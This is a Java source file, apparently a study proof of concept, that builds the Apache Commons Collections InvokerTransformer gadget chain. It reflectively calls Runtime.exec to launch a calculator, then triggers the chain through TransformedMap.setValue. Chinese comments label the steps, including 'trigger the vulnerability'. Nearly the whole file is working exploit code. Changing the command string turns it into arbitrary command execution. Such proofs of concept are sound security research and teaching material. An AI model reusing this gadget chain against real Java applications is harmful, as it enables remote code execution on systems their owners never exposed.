import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class EvalObject {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"mate-calc"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChain
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //触发漏洞
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
    }
}
